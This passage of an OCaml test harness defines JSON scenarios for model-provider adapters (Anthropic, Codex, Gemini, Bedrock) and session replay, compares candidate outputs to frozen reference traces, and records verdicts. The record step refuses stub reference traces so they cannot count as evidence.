                call {|{"function":"normalize_model_name","model":"Anthropic/Claude-Opus-4.1"}|};
                call {|{"function":"sanitize_tool_id","tool_id":""}|};
                call {|{"function":"sanitize_tool_id","tool_id":"call.abc:9/z"}|};
                call {|{"function":"sanitize_tool_id","tool_id":"!!!"}|};
                call {|{"function":"sanitize_tool_id","tool_id":"keep-9_A"}|} ] ) ] ) ]

let candidate_anthropic params =
  let field name = match params with `Assoc fields -> List.assoc_opt name fields | _ -> None in
  let str = function Some (`String s) -> s | _ -> "" in
  match field "calls" with
  | Some (`List calls) ->
      let results =
        List.map
          (fun call ->
            let get k = match call with `Assoc f -> List.assoc_opt k f | _ -> None in
            match str (get "function") with
            | "convert_tools_to_anthropic" ->
                Anthropic_adapter.convert_tools_to_anthropic
                  (match get "tools" with Some t -> t | None -> `Null)
            | "normalize_model_name" ->
                `String (Anthropic_adapter.normalize_model_name (str (get "model")))
            | "sanitize_tool_id" ->
                `String (Anthropic_adapter.sanitize_tool_id (str (get "tool_id")))
            | _ -> `Null)
          calls
      in
      Some (`Assoc [ ("results", `List results) ])
  | _ -> None

let compare_anthropic_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id anthropic_scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no anthropic input defined for " ^ scenario_id)
           ~cause:"the harness has no anthropic scenario for this id"
           ~fix:"add an anthropic_scenarios case, or remove the orphan fixture" ())
  | Some params -> (
      match candidate_anthropic params with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
               ~node:(node_of scenario_id) ~subject:scenario_id
               ~message:"the anthropic scenario is malformed"
               ~cause:"candidate_anthropic could not read the calls list"
               ~fix:"fix the anthropic_scenarios entry" ())
      | Some candidate -> (
          match Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

(* Codex runtime (model_routing): the candidate Responses message-shaping trio
   over a list of dispatched ops, compared to the frozen adapter functions.
   Results pair POSITIONALLY. Pure. *)
let codex_scenarios : (string * Yojson.Safe.t) list =
  let op = Yojson.Safe.from_string in
  [ ( "codex.shapes",
      `Assoc
        [ ( "ops",
            `List
              [ op {|{"op":"content_parts","role":"user","content":["hi","",{"type":"text","text":"there"}]}|};
                op {|{"op":"content_parts","role":"assistant","content":["yo"]}|};
                op {|{"op":"content_parts","role":"user","content":"not-a-list"}|};
                op {|{"op":"content_parts","role":"user","content":[{"type":"image_url","image_url":{"url":"http://x/i.png","detail":"high"}}]}|};
                op {|{"op":"content_parts","role":"user","content":[{"type":"input_image","image_url":""},{"type":"input_image","image_url":"http://y"}]}|};
                op {|{"op":"content_parts","role":"tool","content":[{"type":"text","text":"t","image_url":"http://x"}]}|};
                op {|{"op":"message_status","value":"Completed"}|};
                op {|{"op":"message_status","value":" in-progress "}|};
                op {|{"op":"message_status","value":"in  progress"}|};
                op {|{"op":"message_status","value":"weird"}|};
                op {|{"op":"message_status","value":null}|};
                op {|{"op":"summarize","content":null}|};
                op {|{"op":"summarize","content":"  keep  "}|};
                op {|{"op":"summarize","content":["a","b",{"type":"input_image","image_url":"u"}]}|};
                op {|{"op":"summarize","content":[{"type":"input_image","image_url":"u"},{"type":"image_url"}]}|};
                op {|{"op":"summarize","content":42}|} ] ) ] ) ]

let candidate_codex params =
  let field name = match params with `Assoc fields -> List.assoc_opt name fields | _ -> None in
  let str d = function Some (`String s) -> s | _ -> d in
  match field "ops" with
  | Some (`List ops) ->
      let results =
        List.map
          (fun op ->
            let get k = match op with `Assoc f -> List.assoc_opt k f | _ -> None in
            match str "" (get "op") with
            | "content_parts" ->
                Codex_message_shapes.chat_content_to_responses_parts
                  ~content:(match get "content" with Some c -> c | None -> `Null)
                  ~role:(str "user" (get "role"))
            | "message_status" ->
                `String
                  (Codex_message_shapes.normalize_responses_message_status
                     (match get "value" with Some v -> v | None -> `Null)
                     ~default:"completed")
            | "summarize" ->
                `String
                  (Codex_message_shapes.summarize_user_message_for_log
                     ~content:(match get "content" with Some c -> c | None -> `Null)
                     ~sep:(str " " (get "sep")))
            | _ -> `Null)
          ops
      in
      Some (`Assoc [ ("results", `List results) ])
  | _ -> None

let compare_codex_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id codex_scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no codex input defined for " ^ scenario_id)
           ~cause:"the harness has no codex scenario for this id"
           ~fix:"add a codex_scenarios case, or remove the orphan fixture" ())
  | Some params -> (
      match candidate_codex params with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
               ~node:(node_of scenario_id) ~subject:scenario_id
               ~message:"the codex scenario is malformed"
               ~cause:"candidate_codex could not read the ops list"
               ~fix:"fix the codex_scenarios entry" ())
      | Some candidate -> (
          match Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

(* Gemini adapter (model_routing, first cut): the candidate schema sanitizer over
   a list of tool-parameter schemas, compared to the frozen
   sanitize_gemini_tool_parameters. Results pair POSITIONALLY. Pure. *)
let gemini_scenarios : (string * Yojson.Safe.t) list =
  let sch = Yojson.Safe.from_string in
  [ ( "gemini.schema",
      `Assoc
        [ ( "schemas",
            `List
              [ sch "{}";
                sch "42";
                sch {|{"$schema":"x","type":"object","additionalProperties":false,"properties":{"q":{"type":"string","minLength":1},"mode":{"type":"integer","enum":[1,2,1]},"tags":{"type":"array","items":{"type":"string","format":"slug"},"required":["oops"]}},"required":["q","missing"]}|};
                sch {|{"anyOf":[{"type":"string","bogus":1},"junk",{"type":"integer"}]}|};
                sch {|{"type":"object","required":["gone"]}|};
                sch {|{"type":"string","enum":["a","a","b"],"unknownKey":true}|} ] ) ] ) ]

let candidate_gemini params =
  let field name = match params with `Assoc fields -> List.assoc_opt name fields | _ -> None in
  match field "schemas" with
  | Some (`List schemas) ->
      Some (`Assoc [ ("results", `List (List.map Gemini_schema.sanitize_tool_parameters schemas)) ])
  | _ -> None

let compare_gemini_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id gemini_scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no gemini input defined for " ^ scenario_id)
           ~cause:"the harness has no gemini scenario for this id"
           ~fix:"add a gemini_scenarios case, or remove the orphan fixture" ())
  | Some params -> (
      match candidate_gemini params with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
               ~node:(node_of scenario_id) ~subject:scenario_id
               ~message:"the gemini scenario is malformed"
               ~cause:"candidate_gemini could not read the schemas list"
               ~fix:"fix the gemini_scenarios entry" ())
      | Some candidate -> (
          match Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

(* Cloud vendor adapters (model_routing): the candidate Bedrock Converse shaper
   over a list of cases, compared to the frozen build_converse_kwargs. Results
   pair POSITIONALLY. Pure (import neutralized against network installs). data:
   images and embedded floats are out of the first-cut corpus. *)
let bedrock_scenarios : (string * Yojson.Safe.t) list =
  let c = Yojson.Safe.from_string in
  [ ( "bedrock.converse",
      `Assoc
        [ ( "cases",
            `List
              [ c {|{"model":"us.anthropic.claude-sonnet-4-5-20250929-v1:0","messages":[{"role":"system","content":"be brief"},{"role":"user","content":"hi"}],"tools":[{"type":"function","function":{"name":"get_weather","parameters":{"type":"object","properties":{"city":{"type":"string"}}}}}],"max_tokens":1024,"temperature":0.5}|};
                c {|{"model":"anthropic.claude-opus-4-7-v1:0","messages":[{"role":"user","content":"x"}],"temperature":0.9,"top_p":0.5}|};
                c {|{"model":"eu.anthropic.claude-opus-4-6-v1","messages":[{"role":"user","content":"x"}],"temperature":0.9}|};
                c {|{"model":"amazon.nova-pro-v1:0","messages":[{"role":"system","content":"s"},{"role":"user","content":"u1"},{"role":"assistant","content":"a1"},{"role":"user","content":"u2"}],"temperature":0.2}|};
                c {|{"model":"us.deepseek.r1-v1:0","messages":[{"role":"user","content":"x"}],"tools":[{"function":{"name":"t"}}]}|};
                c {|{"model":"meta.llama3-70b-instruct-v1:0","messages":[{"role":"assistant","content":"lead"},{"role":"user","content":"q"}],"tools":[{"function":{"name":"t"}}],"stop_sequences":["END"],"top_p":0.7}|};
                c {|{"model":"mistral.mistral-large-2407-v1:0","messages":[{"role":"user","content":"q"},{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","function":{"name":"f","arguments":"{\"a\": 1}"}}]},{"role":"tool","tool_call_id":"call_1","content":{"ok":true,"n":2}},{"role":"assistant","content":"   "}]}|};
                c {|{"model":"amazon.titan-text-express-v1","messages":[]}|};
                c {|{"model":"meta.llama3-8b-instruct-v1:0","messages":[{"role":"user","content":"q"},{"role":"assistant","content":[{"type":"text","text":""}]}]}|};
                c {|{"model":"mistral.mixtral-8x7b-instruct-v0:1","messages":[{"role":"system","content":[{"type":"text","text":"a"},{"type":"text","text":"  "},"b",{"type":"image_url","image_url":{"url":"https://i"}},{"type":"text","text":7}]},{"role":"user","content":"q"}]}|};
                c {|{"model":"cohere.command-r-v1:0","messages":[{"role":"user","content":"q"},{"role":"assistant","tool_calls":[{"id":"c1","function":{"name":"f","arguments":"{}"}},{"id":"c2","function":{"name":"g","arguments":"[1, 2]"}}]},{"role":"tool","tool_call_id":"c1","content":"ok"},{"role":"tool","tool_call_id":"c2","content":""}]}|};
                c {|{"model":"amazon.titan-text-lite-v1","messages":[{"role":"user","content":42},{"role":"unknown","content":"zz"}]}|};
                c {|{"model":"amazon.nova-lite-v1:0","messages":[{"role":"user","content":""},{"role":"user","content":[{"type":"text","text":"  "},{"type":"image_url","image_url":{"url":"https://x/y.png"}},"raw"]},{"role":"assistant","content":"","tool_calls":[{"id":"c2","function":{"name":"g","arguments":"not json"}}]}],"guardrail_config":{"guardrailIdentifier":"gr1","guardrailVersion":"1"}}|} ] ) ] ) ]

let candidate_bedrock params =
  let field name = match params with `Assoc fields -> List.assoc_opt name fields | _ -> None in
  match field "cases" with
  | Some (`List cases) ->
      let one case =
        let get k = match case with `Assoc f -> List.assoc_opt k f | _ -> None in
        let model = match get "model" with Some (`String m) -> m | _ -> "" in
        let messages = match get "messages" with Some (`List m) -> m | _ -> [] in
        let tools = match get "tools" with Some (`List t) -> Some t | _ -> None in
        let max_tokens = match get "max_tokens" with Some (`Int n) -> n | _ -> 4096 in
        let temperature = match get "temperature" with Some (`Float f) -> Some f | Some (`Int n) -> Some (float_of_int n) | _ -> None in
        let top_p = match get "top_p" with Some (`Float f) -> Some f | Some (`Int n) -> Some (float_of_int n) | _ -> None in
        let stop_sequences =
          match get "stop_sequences" with
          | Some (`List ss) -> Some (List.filter_map (function `String s -> Some s | _ -> None) ss)
          | _ -> None
        in
        let guardrail_config = get "guardrail_config" in
        Bedrock_converse.build_converse_kwargs ~model ~messages ?tools ~max_tokens ?temperature
          ?top_p ?stop_sequences ?guardrail_config ()
      in
      Some (`Assoc [ ("results", `List (List.map one cases)) ])
  | _ -> None

let compare_bedrock_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id bedrock_scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no bedrock input defined for " ^ scenario_id)
           ~cause:"the harness has no bedrock scenario for this id"
           ~fix:"add a bedrock_scenarios case, or remove the orphan fixture" ())
  | Some params -> (
      match candidate_bedrock params with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
               ~node:(node_of scenario_id) ~subject:scenario_id
               ~message:"the bedrock scenario is malformed"
               ~cause:"candidate_bedrock could not read the cases list"
               ~fix:"fix the bedrock_scenarios entry" ())
      | Some candidate -> (
          match Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

(* Session replay (deterministic-replay track): the candidate's FULL submit ->
   decode path, exercised offline. A pinned Session_fixture binds a request to its
   provider response and the reference's decode; the candidate submits the request
   through a Replay_executor recording (request body -> provider response), and its
   projected decode is compared to the session's reference decode. This is the
   first differential test that drives submit, not just decode. The provider
   responses are the (offline, pinned) decode inputs -- option (a). *)
let session_scenarios : (string * Session_fixture.request * Yojson.Safe.t) list =
  List.map
    (fun (id, provider_response) ->
      let suffix =
        match String.index_opt id '.' with
        | Some i -> String.sub id (i + 1) (String.length id - i - 1)
        | None -> id
      in
      let session_id = "session." ^ suffix in
      ( session_id,
        Session_fixture.
          { endpoint = "https://replay.invalid/v1/chat/completions";
            body = `Assoc [ ("session", `String session_id) ] },
        provider_response ))
    decode_scenarios

let candidate_session (session : Session_fixture.t) =
  let request =
    Openrouter_contract.
      { endpoint = session.Session_fixture.request.Session_fixture.endpoint;
        api_key = Some "replay";
        body = session.Session_fixture.request.Session_fixture.body }
  in
  let recording =
    Replay_executor.record
      ~request_body:(Yojson.Safe.to_string request.Openrouter_contract.body)
      ~status:200
      ~response_body:(Yojson.Safe.to_string session.Session_fixture.provider_response)
      Replay_executor.empty
  in
  match
    Openrouter_transport.submit ~execute:(Replay_executor.executor recording) request
  with
  | Ok response -> Some (project_response response)
  | Error _ -> None

let compare_session_scenario ~root ~normalizer ~snapshot_digest session_id =
  match Session_fixture.load ~root ~normalizer session_id ~snapshot_digest with
  | Error failure ->
      Blocked
        (Fractal_diagnostic.make ~level:Fractal_diagnostic.L4_fixture
           ~origin:Fractal_diagnostic.Evidence ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of session_id) ~subject:session_id
           ~message:("session fixture unavailable: " ^ Session_fixture.describe failure)
           ~cause:"the pinned session could not be loaded"
           ~fix:"capture the session fixture with capture_session_traces, or restore it" ())
  | Ok session -> (
      match candidate_session session with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Implementation ~impact:Fractal_diagnostic.Denies_credit
               ~node:(node_of session_id) ~subject:session_id
               ~message:"candidate submit/decode rejected a session the reference accepts"
               ~cause:"Openrouter_transport.submit returned Error under replay"
               ~fix:"align the candidate submit/decode path with the reference" ())
      | Some candidate ->
          Compared
            (compare ~normalizer ~scenario_id:session_id ~node:(node_of session_id)
               ~reference:session.Session_fixture.reference_decode ~candidate))

(* Which family/contract a scenario's receipts are filed under, and the trace-id
   prefix for its revision-scoped pairs. Routed by scenario id so a second
   capability records under its own identity rather than model_routing's. The
   parity_scenario table has no feature/contract foreign key, so a new family
   needs no catalog seeding to be recorded. *)
let attribution scenario_id =
  let has_prefix p = String.length scenario_id >= String.length p
                     && String.sub scenario_id 0 (String.length p) = p in
  if has_prefix "agent_loop." then
    let sub = String.sub scenario_id 11 (String.length scenario_id - 11) in
    let trace_prefix = String.map (fun c -> if c = '_' then '-' else c) sub in
    ("agent_loop", scenario_id, trace_prefix)
  else if has_prefix "hygiene." then
    ("agent_loop", "agent_loop.message_hygiene", "message-hygiene")
  else if has_prefix "redact." then
    ("agent_loop", "agent_loop.message_hygiene", "message-redaction")
  else if has_prefix "loop." then
    ("agent_loop", "agent_loop.conversation_loop", "conversation-loop")
  else if has_prefix "prompt." then
    ("agent_loop", "agent_loop.prompt_assembly", "prompt-assembly")
  else if has_prefix "context." then
    ("agent_loop", "agent_loop.context_engine", "context-engine")
  else if has_prefix "compress." then
    ("agent_loop", "agent_loop.context_compression", "context-compression")
  else if has_prefix "finalize." then
    ("agent_loop", "agent_loop.turn_finalization", "turn-finalization")
  else if has_prefix "budget." then
    ("agent_loop", "agent_loop.interrupt_control", "interrupt-control")
  else if has_prefix "path." then
    ("tool_execution", "tool_execution.path_and_url_safety", "path-safety")
  else if has_prefix "tool.registry" then
    ("tool_execution", "tool_execution.tool_registry", "tool-registry")
  else if has_prefix "tool.destructive" then
    ("tool_execution", "tool_execution.tool_dispatch", "tool-dispatch")
  else if has_prefix "tool.approval" then
    ("tool_execution", "tool_execution.approval_policy", "approval-policy")
  else if has_prefix "tool.patch" then
    ("tool_execution", "tool_execution.file_operations", "file-operations")
  else if has_prefix "tool.result" then
    ("tool_execution", "tool_execution.result_normalization", "result-normalization")
  else if has_prefix "cfile.coding_context" then
    ("context_files", "context_files.context_file_loading", "context-file-loading")
  else if has_prefix "cfile.ancestor" then
    ("context_files", "context_files.subdirectory_hints", "subdirectory-hints")
  else if has_prefix "cfile.breakdown" then
    ("context_files", "context_files.context_breakdown", "context-breakdown")
  else if has_prefix "cfile.cwd_placeholder" then
    ("context_files", "context_files.runtime_cwd_scope", "runtime-cwd-scope")
  else if has_prefix "mem.manager" then
    ("memory", "memory.memory_manager", "memory-manager")
  else if has_prefix "mem.trivial" then
    ("memory", "memory.memory_providers", "memory-providers")
  else if has_prefix "mem.session_state" then
    ("memory", "memory.session_state", "session-state")
  else if has_prefix "mem.portability" then
    ("memory", "memory.state_portability", "state-portability")
  else if has_prefix "skill.discovery" then
    ("skills", "skills.skill_discovery", "skill-discovery")
  else if has_prefix "skill.bundles" then
    ("skills", "skills.skill_bundles", "skill-bundles")
  else if has_prefix "skill.preprocessing" then
    ("skills", "skills.skill_preprocessing", "skill-preprocessing")
  else if has_prefix "skill.sync" then
    ("skills", "skills.skill_sync", "skill-sync")
  else if has_prefix "skill.provenance" then
    ("skills", "skills.skill_provenance", "skill-provenance")
  else if has_prefix "cli.repl" then
    ("interactive_cli", "interactive_cli.repl_session", "repl-session")
  else if has_prefix "cli.slash" then
    ("interactive_cli", "interactive_cli.slash_commands", "slash-commands")
  else if has_prefix "cli.fuzzy" then
    ("interactive_cli", "interactive_cli.terminal_ui", "terminal-ui")
  else if has_prefix "cli.approval" then
    ("interactive_cli", "interactive_cli.approval_prompts", "approval-prompts")
  else if has_prefix "cli.bang" then
    ("interactive_cli", "interactive_cli.shell_passthrough", "shell-passthrough")
  else if has_prefix "mcp.client" then ("mcp", "mcp.mcp_client", "mcp-client")
  else if has_prefix "mcp.oauth" then ("mcp", "mcp.mcp_oauth", "mcp-oauth")
  else if has_prefix "mcp.config" then ("mcp", "mcp.mcp_configuration", "mcp-configuration")
  else if has_prefix "mcp.surface" then ("mcp", "mcp.mcp_server_surface", "mcp-server-surface")
  else if has_prefix "mcp.supervision" then ("mcp", "mcp.mcp_supervision", "mcp-supervision")
  else if has_prefix "sub.lifecycle" then ("subagents", "subagents.subagent_lifecycle", "subagent-lifecycle")
  else if has_prefix "sub.delegation" then ("subagents", "subagents.delegation", "delegation")
  else if has_prefix "sub.async" then ("subagents", "subagents.async_delegation", "async-delegation")
  else if has_prefix "sub.moa" then ("subagents", "subagents.mixture_of_agents", "mixture-of-agents")
  else if has_prefix "sub.kanban" then ("subagents", "subagents.kanban_swarm", "kanban-swarm")
  else if has_prefix "retry." then
    ("model_routing", "model_routing.rate_and_retry", "retry-after")
  else if has_prefix "route." then
    ("model_routing", "model_routing.route_resolution", "route-resolution")
  else if has_prefix "anthropic." then
    ("model_routing", "model_routing.anthropic_adapter", "anthropic-adapter")
  else if has_prefix "codex." then
    ("model_routing", "model_routing.codex_runtime", "codex-runtime")
  else if has_prefix "gemini." then
    ("model_routing", "model_routing.gemini_adapter", "gemini-adapter")
  else if has_prefix "bedrock." then
    ("model_routing", "model_routing.cloud_vendor_adapters", "cloud-vendor-adapters")
  else if has_prefix "session." then
    ("model_routing", "model_routing.provider_transports.session_replay", "session-replay")
  else ("model_routing", "model_routing.provider_transports.request_shaping", "request-shaping")

(* Record a completed comparison as L4 scenario, L5 trace pair and L6 receipt.
   A Blocked outcome records nothing: there is no trace pair to record and no
   verdict to stand behind. *)
(* A reference trace whose payload is the stub template proves nothing. It
   exercises one-line generic request shaping -- the path
   model_routing.provider_transports already verified 9/9 -- while carrying
   the NAME of a capability it never touches. Any candidate reproduces it,
   including one that implements nothing, so a receipt built on it grants a
   capability credit no scenario earned. That is H-1, and R14 names the shape:
   the proven-not-differential trap.

   This is not hypothetical. On 2026-08-09 the stub_slices migration injected
   88 such scenarios into capture_reference_traces; they were captured against
   the frozen reference and pinned under 88 capability names, where they still
   sit. Seven of them are named by agent_loop_scenarios and would be recorded
   by any compare run.

   The refusal lives HERE, at the single point where a comparison becomes
   durable, rather than at each of the twelve comparison groups -- a guard at
   one choke point covers every future group for free, which is exactly what
   the 88 needed and did not have.

   The caller renders this as Control origin / Blocks_credit: the harness's own
   fixture corpus is at fault, never the candidate, so it can only BLOCK credit
   and can never DENY it (R5).

   The predicate itself lives in Reference_capture, beside the save that now
   refuses to PIN one, so the two guards cannot drift apart into disagreeing
   about what a stub is. Save stops the artifact; this stops the receipt. *)
let stub_payload_prefix = Reference_capture.stub_payload_prefix
let is_stub_payload = Reference_capture.is_stub_payload

let record ~store ~snapshot_digest ~harness_revision ~normalizer comparison =
  if is_stub_payload comparison.reference then
    Error
      (Printf.sprintf
         "HZ-FIX-03: reference trace for %s is a stub payload (%S): it exercises no \
          part of the capability it is named for, so no verdict over it is \
          differential evidence. Author a scenario that FAILS against a \
          deliberately wrong candidate, capture it from the frozen reference, and \
          pin that instead. Never hand-edit the committed trace (HZ-FIX-01)."
         comparison.scenario_id stub_payload_prefix)
  else
  let normalization = Parity_normalizer.describe normalizer in
  (* The trace id is revision-scoped. The reference half of a pair is frozen and
     immutable per snapshot, but the candidate half evolves as the candidate is
     developed, so a later revision must record its own candidate trace rather
     than collide with an earlier divergent one under an immutable key. Without
     this, fixing a candidate gap silently fails to record the corrected trace
     -- found exactly that way, by grepping the record failures the compare
     command prints. *)
  let feature_id, contract_id, trace_prefix = attribution comparison.scenario_id in
  let trace_id = trace_prefix ^ "@" ^ harness_revision in
  let scenario : Evidence_store.scenario =
    { snapshot_digest; id = comparison.scenario_id; feature_id; contract_id;
      fixture_digest = comparison.reference_digest;
      reference_digest = comparison.reference_digest }
  in
  let trace : Evidence_store.paired_trace =
    { snapshot_digest; scenario_id = comparison.scenario_id; trace_id;
      reference_trace = Parity_normalizer.render normalizer comparison.reference;
      candidate_trace = Parity_normalizer.render normalizer comparison.candidate;
      normalization_version = normalization }
  in
  let passed = comparison.verdict = Parity_algebra.Verified in
  let verification : Evidence_store.verification =
    { snapshot_digest; scenario_id = comparison.scenario_id; trace_id;
      verifier = "parity-compare-v1"; harness_revision; check = "normalized-trace-equal";
      passed; evidence_digest = comparison.candidate_digest }
  in
  match Evidence_store.record_scenario store scenario with
  | Error _ as error -> error
  | Ok () -> (
      match Evidence_store.record_paired_trace store trace with
      | Error _ as error -> error
      | Ok () -> Evidence_store.record_verification store verification)

(* The scenarios currently under differential test. Kept explicit rather than
   discovered from the fixture directory, so an accidentally-deleted fixture is
   a Blocked outcome (visible) rather than a silently smaller run. *)
let scenarios =
  [ "chat.minimal"; "chat.max_tokens"; "chat.anthropic_model"; "chat.system_prefix";
    "chat.with_tools"; "chat.multi_turn"; "chat.codex_developer";
    "chat.anthropic_system"; "chat.two_tools" ]

(* Roll the per-scenario verdicts up into a single family verdict under the
   proved algebra. The provider-transport capability is required, so an empty
   or blocked run does not read as verified. *)
let roll_up outcomes =
  Parity_algebra.report ~required:true (List.map outcome_verdict outcomes)
